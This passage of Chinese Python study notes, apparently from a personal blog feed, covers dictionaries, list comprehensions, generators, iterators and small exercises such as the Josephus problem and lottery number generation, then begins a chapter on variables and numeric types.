<p>1、<code>string内置模块</code>的使用<br>2、<code>random模块</code>的使用<br>3、<code>fromkeys()函数</code>的使用–构建字典<br>4、字典的一些<code>操作</code>，如：遍历、取值等<br>5、<code>for in 循环结构</code></p>
</blockquote>
</blockquote>
<p><strong>下面是数字示例</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">number = []</span><br><span class="line">result = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    num = random.randint(<span class="number">0</span>,<span class="number">100</span>)</span><br><span class="line">    number.append(num)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> number:</span><br><span class="line">    <span class="keyword">if</span> num <span class="keyword">in</span> result.keys():</span><br><span class="line">        result[num]+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result[num]=<span class="number">1</span></span><br><span class="line">        </span><br><span class="line">max_num = <span class="built_in">max</span>(result.values())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> result.items():</span><br><span class="line">    <span class="keyword">if</span> item[<span class="number">1</span>] == max_num:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;出现次数最多的是%d,出现次数为：%d&quot;</span>%(item[<span class="number">0</span>],item[<span class="number">1</span>]))</span><br><span class="line">    </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>下面是字符示例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="comment">#生成全部大小写字母、数字和符号</span></span><br><span class="line">x = string.ascii_letters + string.digits + string.punctuation</span><br><span class="line">mystring=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    mystring+=random.choice(x) <span class="comment">#choice方法返回一个列表，元组或字符串的随机项</span></span><br><span class="line"><span class="comment">#利用fromkeys()形成一个字典，所有键的值均为0，重复的键将被自动忽略</span></span><br><span class="line"></span><br><span class="line">mydict = <span class="built_in">dict</span>.fromkeys(mystring,<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> mystring:</span><br><span class="line">    mydict[i]+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">max_num = <span class="built_in">max</span>(mydict.values())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#输出字符以及次数，即字典的键和值</span></span><br><span class="line"><span class="keyword">for</span> key,value <span class="keyword">in</span> mydict.items():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;字符&#123;&#125;有&#123;&#125;次&#x27;</span>.<span class="built_in">format</span>(key,value))</span><br><span class="line"><span class="comment">#找到最大的次数    </span></span><br><span class="line">max_num = <span class="built_in">max</span>(mydict.values())</span><br><span class="line"><span class="built_in">print</span>(max_num)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> key,value <span class="keyword">in</span> mydict.items():</span><br><span class="line">    <span class="keyword">if</span> value == max_num:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;出现次数最大的字符为：%s，出现的次数为：%d&quot;</span>%(key,value))</span><br></pre></td></tr></table></figure>

<h1 id="列表生成式"><a href="#列表生成式" class="headerlink" title="列表生成式"></a>列表生成式</h1><blockquote>
<p>这是一个python内置的强大功能，可以进行列表的生成，使得代码更为简洁。</p>
</blockquote>
<p><strong>语法格式</strong>：【表达式 for 循环计数器 in 可迭代对象】<br><strong>代码实例</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line">list2 = [x+<span class="number">1</span> <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="built_in">pow</span>(x,<span class="number">2</span>) <span class="keyword">for</span> x <span class="keyword">in</span> list1]]</span><br><span class="line"><span class="built_in">print</span>(list2)</span><br><span class="line"></span><br><span class="line">list3 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">list4 = [<span class="string">&#x27;name1&#x27;</span>,<span class="string">&#x27;name2&#x27;</span>,<span class="string">&#x27;name3&#x27;</span>]</span><br><span class="line">L = [x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">zip</span>(list3,list4)]</span><br><span class="line"><span class="built_in">print</span>(L)</span><br><span class="line"></span><br><span class="line">list5 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line">list6 = [x <span class="keyword">for</span> x <span class="keyword">in</span> list5 <span class="keyword">if</span> x%<span class="number">2</span>==<span class="number">1</span>] <span class="comment"># 使用if语句进行筛选元素</span></span><br><span class="line">ptint(list6)</span><br></pre></td></tr></table></figure>
<p><strong>结果演示</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752639622.png"></p>
<p><strong>注意点</strong>：<br>1、注意使用时的格式，要把输入元素放在<strong>第一位</strong>。也可以<strong>使用if语句</strong>进一步选择元素。<br>2、<strong>zip()可以</strong>使多个列表的元素一一对应后成为一个新的列表，其中的每一个元素是一个元组。</p>
<h1 id="生成器"><a href="#生成器" class="headerlink" title="生成器"></a>生成器</h1><blockquote>
<p>采用生成器创建列表更加节省空间。</p>
<blockquote>
<p>在列表生成式使用时，对于列表元素较多时，不建议使用。因为这种方法会实例化一个对象，占用内存空间。<br>而生成器是一边循环一边计算的，可以适用。 </p>
</blockquote>
</blockquote>
<p><strong>语法格式</strong>：<code>(表达式 for 循环计数器 in 可迭代对象)</code><br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752639662.png"></p>
<p><strong>输出方法</strong>：（无法通过print直接输出元素）</p>
<ol>
<li><p>通过next方法输出<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752639667.png"><br> 会根据元素个数单个取出元素，但是这种方法太低效。</p>
</li>
<li><p>使用for in 循环输出<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752639663.png"></p>
</li>
</ol>
<h1 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h1><h2 id="可迭代对象"><a href="#可迭代对象" class="headerlink" title="可迭代对象"></a>可迭代对象</h2><p><strong>定义</strong>：可迭代对象是指可以直接<strong>作用于for循环</strong>的对象。<br><strong>分类</strong>：</p>
<ul>
<li>数据类型：tuple、list、dict、set、string</li>
<li>generator：生成器或者带yield的generator function</li>
</ul>
<p><strong>易错点</strong>：有无下标<strong>不是</strong>判断是否为可迭代对象的条件。如字典、集合等<strong>无下标</strong>仍为可迭代对象。</p>
<blockquote>
<p>如何判断是否为可迭代对象呢？</p>
</blockquote>
<p>使用collections模型的Iterable类型判断是否为可迭代对象。</p>
<p><strong>代码实例</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span>  collections </span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用isinstance()函数判断一个对象是否为已知类型</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">isinstance</span>(<span class="string">&#x27;abc&#x27;</span>,Iterable))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">isinstance</span>([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],Iterable))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">isinstance</span>(<span class="number">123</span>,Iterable))</span><br></pre></td></tr></table></figure>
<p><strong>结果演示</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752639664.png"></p>
<h2 id="什么是迭代器（Iterator"><a href="#什么是迭代器（Iterator" class="headerlink" title="什么是迭代器（Iterator)"></a>什么是迭代器（Iterator)</h2><p>迭代器就是<strong>具有next方法</strong>的对象。</p>
<blockquote>
<p>list、dict、str、set、tuple虽然是一个Iterable,却不是Iterator</p>
</blockquote>
<p>使用dir()查看上述类型，并没有next方法。</p>
<hr>
<blockquote>
<p>Iterator的解释</p>
</blockquote>
<p><code>Iterator</code>是一个<strong>数据流</strong>，可以看作是一个有序序列，但是<strong>不知道</strong>序列的长度。<br>在使用<strong>next()函数</strong>时可以实现数据的下一步计算，即只有需要返回时才会进行数据的计算（<strong>惰性计算</strong>）</p>
<blockquote>
<p>Iterator的创建方法</p>
</blockquote>
<p>1、可以使用<strong>iter函数</strong>获得Iterator对象（如下图）</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752639665.png"></p>
<p>2、使用<strong>for循环</strong>或者<strong>while循环</strong>进行遍历</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">L1 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">g = <span class="built_in">iter</span>(L1)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(g))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用for循环遍历</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> g:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用while循环遍历（用到except捕获错误信息）</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">next</span>(g))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">except</span> StopIteration:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h1 id="问题补充"><a href="#问题补充" class="headerlink" title="问题补充"></a>问题补充</h1><blockquote>
<p>主要记录在头歌实训和作业上的收获</p>
</blockquote>
<h2 id="应用实例"><a href="#应用实例" class="headerlink" title="应用实例"></a>应用实例</h2><ol>
<li>列表、循环–约瑟夫环问题</li>
</ol>
<p><strong>题干</strong>：<br>有15个基督徒和15个非基督徒在海上遇险，为了能让一部分人活下来不得不将其中15个人扔到海里面去，有个人想了个办法就是大家围成一个圈，由某个人开始从1报数，报到9的人就扔到海里面，他后面的人接着从1开始报数，报到9的人继续扔到海里面，直到扔掉15个人。由于上帝的保佑，15个基督徒都幸免于难，问这些人最开始是怎么站的，哪些位置是基督徒哪些位置是非基督徒。（用1代表基督徒，0代表非基督徒）</p>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    index = <span class="number">0</span>  <span class="comment"># 用于下标索引</span></span><br><span class="line">    count = <span class="number">0</span>  <span class="comment"># 记录非基督教徒人数</span></span><br><span class="line">    number = <span class="number">0</span> <span class="comment"># 记录当前数到的数字</span></span><br><span class="line">    list1 = [<span class="number">1</span>]*<span class="number">30</span></span><br><span class="line">    <span class="keyword">while</span> count&lt;<span class="number">15</span>:</span><br><span class="line">        <span class="keyword">if</span> list1[index] == <span class="number">1</span>:</span><br><span class="line">            number += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> number == <span class="number">9</span>:</span><br><span class="line">                list1[index]=<span class="number">0</span> <span class="comment"># 相当于扔到海里</span></span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">                number = <span class="number">0</span></span><br><span class="line">        index+=<span class="number">1</span></span><br><span class="line">        index%=<span class="number">30</span>  <span class="comment"># 将列表当做一个圆圈，当读到最后时返回第一位</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> list1:</span><br><span class="line">        <span class="built_in">print</span>(i,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>打印三角形–for in 循环</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,row+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;*&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 靠右三角形</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,row+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(row-i):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot; &quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(i):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;*&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 中间三角形</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(row):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(row-i-<span class="number">1</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot; &quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>*(i+<span class="number">1</span>)-<span class="number">1</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;*&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>注意事项</strong>：<br>使用range()生成的序列是<strong>前闭后开</strong>的。若为单个参数，则其中数字个数就是<strong>参数值</strong>。</p>
<ol start="3">
<li>随机数生成–双色球生成</li>
</ol>
<p><strong>题干</strong>：<br>双色球选号由7个数字组成y，其中有6个红球，其号码的取值范围为[1,33],一个蓝球的取值范围为[1,16],要求6个红球从小到大排列，蓝球在最后输出。其输出格式为09 12 16 20 30 33 | 03。（注意，如双色球号码为3，则必须输出03）</p>
<p>代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange, randint, sample</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">display</span>(<span class="params">balls</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;%02d &quot;</span>%balls[i],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;| %02d &quot;</span>%balls[i+<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">random_select</span>():</span><br><span class="line"></span><br><span class="line">    list1 = [x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">34</span>)]</span><br><span class="line">    </span><br><span class="line">    select_num1 = sample(list1,<span class="number">6</span>)</span><br><span class="line">    select_num1.sort()</span><br><span class="line">    select_num1.append(randint(<span class="number">1</span>,<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> select_num1</span><br><span class="line"></span><br><span class="line"><span class="comment">#n为注数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">n</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        display(random_select())</span><br><span class="line">        </span><br><span class="line">random.seed(<span class="number">3</span>)</span><br><span class="line">n = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(n)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>注意点</strong>：<br>1、<code>randint(1,15)</code>在【1，15】中选择一个数。<code>sample(list1,6)</code>从list1中等可能选择6个数组成一个列表。<br>2、一定要分清列表的方法和函数的区别，例如：<code>list1 = list1.sort()</code>是错误的，要使用<code>list1.sort()</code>.</p>
<h2 id="单元测试"><a href="#单元测试" class="headerlink" title="单元测试"></a>单元测试</h2><ol>
<li>生成器</li>
</ol>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752639666.png"></p>
<p>其类型都是生成器<code>&lt;class &#39;generator&#39;&gt;</code><br>可以使用for in 读取，但是不可以直接输出。</p>
<hr>
<ol start="2">
<li>enumerate(x) 函数<br><code>enumerate() 函数</code>用于将一个可遍历的数据对象(如列表、元组或字符串)组合为一个索引序列，同时列出数据和数据下标，一般用在 for 循环当中。</li>
</ol>
<p><strong>实例</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752639668.png"></p>
<hr>
<ol start="3">
<li><code>str.replace()方法</code></li>
</ol>
<p>Python replace() 方法把字符串中的 old（旧字符串） 替换成 new(新字符串)，如果指定第三个参数max，则替换不超过 max 次。</p>
<p><strong>注</strong>：因为字符串是不可变序列，所以会生成一个新的字符串，源字符串不变，</p>
<hr>
<ol start="4">
<li>排序问题</li>
</ol>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752639669.png"><br>key参数：自定义比较规则。这里是比较字符串第二个字符</p>
<p><a href="http://c.biancheng.net/view/2239.html">http://c.biancheng.net/view/2239.html</a></p>
<hr>
<ol start="5">
<li>遍历列表</li>
</ol>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752639698.png"></p>
<p>列表会动态变化的。</p>
]]></content>
      <categories>
        <category>【-基础知识-】编程语言学习</category>
        <category>python学习</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python学习-ch2基本数据类型</title>
    <url>/2023/04/10/Python%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0-%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</url>
    <content><![CDATA[<h1 id="导学"><a href="#导学" class="headerlink" title="导学"></a>导学</h1><blockquote>
<p>在正课开始之前对所要学习的内容进行梳理。</p>
</blockquote>
<h2 id="主要内容–7个部分"><a href="#主要内容–7个部分" class="headerlink" title="主要内容–7个部分"></a>主要内容–7个部分</h2><blockquote>
<p>变量</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581185429.png" alt="变量"></p>
<blockquote>
<p>数字类型</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581185432.png" alt="数字类型"></p>
<blockquote>
<p>字符串</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581185434.png" alt="字符串"></p>
<blockquote>
<p>基本输入输出</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581185436.png" alt="IOP"></p>
<blockquote>
<p>编程规范</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581185439.png" alt="编码规范"></p>
<blockquote>
<p>编码格式</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581185440.png" alt="编码格式"></p>
<blockquote>
<p>两个实例</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581185441.png" alt="实例"></p>
<h2 id="目标和要求"><a href="#目标和要求" class="headerlink" title="目标和要求"></a>目标和要求</h2><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581185444.png" alt="目标和要求"></p>
<p>在本节，要求完成第一个实训作业：turtle作品，会阅读官方文档。</p>
<hr>
<blockquote>
<p>下面我们就按照上面的规划进行深入的学习——&gt;</p>
</blockquote>
<hr>
<h1 id="2-1-变量"><a href="#2-1-变量" class="headerlink" title="2.1 变量"></a>2.1 变量</h1><blockquote>
<p>下面给出本小节思维导图</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581185442.png" alt="思维导图-2.1"></p>
<h2 id="变量的定义"><a href="#变量的定义" class="headerlink" title="变量的定义"></a>变量的定义</h2><ul>
<li>在编程语言的学习中，变量是最基础的东西。</li>
<li>与其他语言不同的是，Python是一个<strong>弱类型语言</strong>，不需要事先声明变量名及其类型，直接赋值即可创建各种类型的对象变量。</li>
<li>使用type(x)查看对象类型</li>
</ul>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581185445.png" alt="eg1"></p>
<blockquote>
<p>Python采用基于值的内存管理方式</p>
</blockquote>
<ul>
<li>为不同变量赋予相同的值，那么这个值<strong>在内存中只有一份</strong>，多个变量执行同一块内存地址</li>
<li>使用<code>id(x)</code>获取对象x的内存地址</li>
</ul>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581185446.png" alt="一个地址"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581185448.png" alt="eg2.1"></p>
<h2 id="变量的命名规范"><a href="#变量的命名规范" class="headerlink" title="变量的命名规范"></a>变量的命名规范</h2><p>一个规范的变量名应该符合以下6条规则（最后一条是更深的要求）：</p>
<ul>
<li>以字母、下划线开头，后面可以跟任意字母、下划线、数字</li>
<li>变量名不能以数字开头</li>
<li>变量名对字母大小写敏感</li>
<li>不可以有空格以及标点符号</li>
<li>不可以使用关键字或者内置函数作为变量名</li>
<li>作为一名合格的程序员，变量的命名要与其含义相关，尽量不要使用简单的字母命名，一时的便利会带来长久的麻烦。（所以要学号英语哦）</li>
</ul>
<h2 id="查看关键字和内置函数"><a href="#查看关键字和内置函数" class="headerlink" title="查看关键字和内置函数"></a>查看关键字和内置函数</h2><blockquote>
<p>上面我们已经提到变量的命名规则，其中有一条是不可使用关键字和内置函数。在实际的编程中，我们可以一些帮助文档进行查看。</p>
</blockquote>
<ol>
<li>关键字的查看：<code>help(&#39;keywords&#39;)</code><br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581185468.png" alt="关键字"></li>
</ol>
<p>注：使用<code>import keyword</code>   —&gt;  <code> keyword.kwlist</code>也可以看到。<br>使用len()可以得到关键字的个数：<strong>35个</strong><br>（len属于内置函数，解释器启动既有；而内置模块需要import)</p>
<ol start="2">
<li>内置函数的查看：<code> import builtins</code> —&gt; <code> dir(builtins)</code><br>ps:该模块提供对Python的所有“内置”标识符的直接访问<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581185471.png" alt="内置函数"></li>
</ol>
<h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><ul>
<li>常量在指定初始值后不再改变</li>
<li>一般使用大写字母表示</li>
<li>遵循常量阅读，使得代码具有良好的可读性（PI &#x3D; 3.14等）</li>
</ul>
<h1 id="2-2数字类型"><a href="#2-2数字类型" class="headerlink" title="2.2数字类型"></a>2.2数字类型</h1><blockquote>
<p>本小节思维导图</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581185473.png" alt="思维导图2.2"></p>
<p>ps：本节要求掌握基本数字类型的表示与进制之间的转换</p>
<ul>
<li>Python中的数据类型很多，比如数字、字符串、列表、字典、文件等基本数据类型</li>
<li>数据类型和值相关，而不是和变量相关。（基于值的内存管理模式）</li>
<li>数字类型包括：整数、浮点数、复数</li>
</ul>
<h2 id="整数、浮点数、复数"><a href="#整数、浮点数、复数" class="headerlink" title="整数、浮点数、复数"></a>整数、浮点数、复数</h2><h3 id="整数和浮点数"><a href="#整数和浮点数" class="headerlink" title="整数和浮点数"></a>整数和浮点数</h3><ul>
<li>整数和浮点数的差异在于是否包含小数部分</li>
<li>浮点数必须<strong>包含一个小数点</strong>，否则会被当做整数</li>
<li><code>int </code>表示整数；<code>float</code>表示浮点数</li>
</ul>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581185474.png" alt="差异"></p>
<blockquote>
<p>浮点数补充——&gt;</p>
</blockquote>
<p>浮点数有两种表示形式：</p>
<ul>
<li>十进制形式，例如：3.14  5.21等</li>
<li>科学计数形式：5.21e2或5.21E2 就是指5.21* 10^2</li>
</ul>
<p>注：只有浮点数可以使用科学计数的方法<br>并且如果运算是既有整数又有浮点数，结果为浮点数。</p>
<h3 id="复数"><a href="#复数" class="headerlink" title="复数"></a>复数</h3><p>复数的虚部用j或J表示：<code>a=3+4j  </code><br>使用 <code>x.real</code> 和 <code>x.imag</code>获取实部、虚部的数值，以<strong>浮点数</strong>的形式输出。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581185476.png" alt="表示和运算"></p>
<h2 id="进制之间的转换"><a href="#进制之间的转换" class="headerlink" title="进制之间的转换"></a>进制之间的转换</h2><blockquote>
<p>整数的表示方法</p>
</blockquote>
<p>一个整数可以采用多种进制进行表示：</p>
<ul>
<li>十进制</li>
<li>二进制 0b或者0B</li>
<li>八进制 0o或者0O</li>
<li>十六进制 0x或者0X</li>
</ul>
<blockquote>
<p>不同进制之间可以进行转换(使用Python的内置函数)</p>
</blockquote>
<ul>
<li><code>int(x, d)</code>  —&gt;  接收的是字符串x，转换d进制的整数为十进制</li>
<li><code>bin(x)</code>   —&gt;   将十进制数x转换为二进制</li>
<li><code>oct(x)</code>   —&gt;   将十进制数x转换为八进制</li>
<li><code>hex(x) </code>  —&gt;   将十进制数x转换为十六进制</li>
</ul>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581185479.png" alt="eg2.2.2"></p>
<h2 id="内置模块"><a href="#内置模块" class="headerlink" title="内置模块"></a>内置模块</h2><blockquote>
<p>Python中含有很多<strong>标准库</strong>，也就是封装好的已有的代码合集。<br>Python中的标准库被组织为<strong>模块</strong>，相关的函数和数据类型被分组封装在不同的模块中，需要使用时需要进行<strong>模块的导入</strong></p>
</blockquote>
<h3 id="内置模块–math"><a href="#内置模块–math" class="headerlink" title="内置模块–math"></a>内置模块–math</h3><blockquote>
<p><code>import math</code>导入模块</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581185480.png" alt="math模块"></p>
<p>注：使用<code>dir(math)</code>查看math模块下的内置函数<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581185482.png" alt="dir"></p>
<h3 id="内置模块–random"><a href="#内置模块–random" class="headerlink" title="内置模块–random"></a>内置模块–random</h3><blockquote>
<p><code>random,random()</code>随机生成一个<strong>实数</strong>，在[0, 1]范围<br><code>random.randint(a, b)</code>用于生成一个指定范围的<strong>整数</strong>。(前闭后开)</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581185639.png" alt="eg2.2.3"></p>
<h1 id="2-3-字符串"><a href="#2-3-字符串" class="headerlink" title="2.3 字符串"></a>2.3 字符串</h1><blockquote>
<p>下面给出本节思维导图</p>
</blockquote>
